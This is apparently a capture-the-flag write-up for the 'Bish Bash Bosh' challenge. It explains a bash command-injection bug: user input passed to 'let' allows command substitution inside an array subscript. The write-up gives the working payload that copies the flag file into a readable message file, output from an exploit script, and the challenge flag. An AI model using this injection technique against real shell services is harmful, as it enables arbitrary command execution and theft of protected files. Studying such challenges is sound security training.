---
title: "Bish Bash Bosh"
ctf: "platypwnies 2026"
date: 2026-11-14
category: misc
difficulty: 1
points: n/a
flag_format: "PP{...}"
author: "author"
flags:
 - "PP{l3t_t00k_my_fl4g!!!::8qfmmzoEVkn0}"
---

# Bish Bash Bosh

## Summary

A `socat`-exposed bash script (`server.sh`) that lets you pick message 0..2 and prints it
from a bash array. Index 0 is the flag (`/flag/flag.txt`), but after `let i=$i-1` the guard
only accepts `i` in `1..3`, so 0 is unreachable through normal input. The trick: `let` /
`()` evaluate the *value* of `i` as an arithmetic expression, and a **command
substitution inside an array subscript** written in that value is expanded by the shell —
*before* the guard ever runs. So you can execute arbitrary shell once per connection, then
read the result on a second connection from a poisoned message file.

## Solution / Exploit

### The vulnerable script

`server.sh`:

```bash
#!/usr/bin/env bash

files=(
 "/flag/flag.txt"
 "msg1"
 "msg2"
 "msg3"
)

echo "What message would you like to see? (0..2)"
read -r i
let i=$i-1

if (( i < 1 || i > 3 )); then
 echo "Nuh uh"
 exit 1
fi

file="${files[i]}"
cat -- "$file"
```

The flag is `files[0]`, but the guard only lets `i` be `1..3` after the `let` — index 1
gives `Nuh uh` (0 < 1). Nothing reads the flag directly.

### The bug — command substitution in an array subscript inside arithmetic

`let i=$i-1` and `(( ... ))` evaluate the **value** of `i` as an arithmetic expression. If
that value is an array subscript (`a[...]`), the subscript is subject to the normal shell
expansions — including `$` — and it runs **before** the guard can reject the input. The
subscript then errors (`bad array subscript`), the guard prints `Nuh uh` and exits, but the
side effect has already happened.

### Two-connection chain

The container runs as **root** and its filesystem is writable, so the command substitution
can overwrite one of the message files (`msg1`, reachable as index 1) with the flag, then a
second connection reads it back.

**Connection 1** — copy the flag over a readable message file:

```
a[$(cat /flag/flag.txt >/msg1)]
```

`let i=$i-1` evaluates `i=a[$(cat /flag/flag.txt >/msg1)]-1`; the substitution runs and
copies the flag to `/msg1`. The arithmetic then errors, the guard fires, the connection
closes.

**Connection 2** — read the now-poisoned message:

```
2
```

`let i=2-1` → `i=1`, the guard passes (`1..3`), `files[1]` is `msg1`, and `cat` prints the
flag.

`bbb_exploit.py` automates exactly this:

```
$ python3 bbb_exploit.py 10.83.2.242 9000
[*] conn1: sending command-substitution payload to copy /flag/flag.txt -> /msg1
[+] conn1 done (guard fires as expected)
[*] conn2: requesting message index 2 (=> files[1] == msg1)
[+] PP{l3t_t00k_my_fl4g!!!::8qfmmzoEVkn0}
```

## Flag(s)

```
PP{l3t_t00k_my_fl4g!!!::8qfmmzoEVkn0}
```

## Notes / Pitfalls

- **stderr goes to the container log, not the socket.** `socat ... EXEC:/server.sh` does
 not merge stderr into the socket, so `>&2` leaks nothing back to you — the
 copy-to-a-readable-file then read-it-back chain is what works.
- **Only one message slot is needed.** Any writable file reachable as `files[1..3]`
 (`msg1`/`msg2`/`msg3`) works; `/msg1` is convenient because index `1` maps to input `2`.
- **The input is used verbatim in `let`.** No quoting/validation, which is exactly why an
 array subscript survives parsing as an arithmetic expression.
- **Root + writable fs is the enabler.** If the process ran unprivileged with a read-only
 root, the same bug would still execute a command, but writing into `/msg*` (and thus the
 two-connection read-back) would need a different destination.
- **Instance is live-only.** Target `10.83.2.242:9000` requires the platform instance (and
 the event VPN). The solve script above reproduces the documented, source-verified chain;
 it was not re-run against the (now gone) live instance.
